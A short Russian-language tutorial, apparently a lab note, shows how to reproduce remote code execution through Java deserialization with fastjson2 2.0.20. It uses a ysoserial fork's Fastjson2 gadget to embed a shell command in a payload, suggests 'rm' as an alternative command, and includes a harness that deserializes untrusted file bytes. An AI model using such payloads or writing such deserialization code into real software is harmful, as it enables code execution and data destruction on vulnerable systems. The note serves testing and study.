**Ysoserial Fastjson2**

Для того, чтобы ysoserial заработал с библиотекой fastjson2, необходимо использовать следующий fork:
https://github.com/Y4er/ysoserial/tree/main

Генерируем payload следующей командой:

```
java -jar ysoserial.jar Fastjson2 "mkdir created_dir"> mkdir_v2.bin
```

Данный запрос создат папку create_dir. В качестве аналогов, можно использовать "rm <file_name>" или "firefox" и так далее.

Теперь пишем код, который сериализует объект из файла:

```
package org.example;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.ObjectInputStream;
import java.nio.file.Files;

public class Main {
    public static void main(String[] args)  {
        try{
            byte[] data = Files.readAllBytes(new File(args[0]).toPath());
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(data));
        objectInputStream.readObject();
        objectInputStream.close();
    }catch (Exception e){
        e.printStackTrace();
        }
    }
}
```
Нужно не забыть импортировать библиотеку fastjson2 (протестированно для версии <= 20):

```
implementation("com.alibaba.fastjson2:fastjson2:2.0.20")
```

В процессе выполнения, может появится следующая ошибка, но при этом команда исполнится:

![Search Result](/images/image_b.jpg)
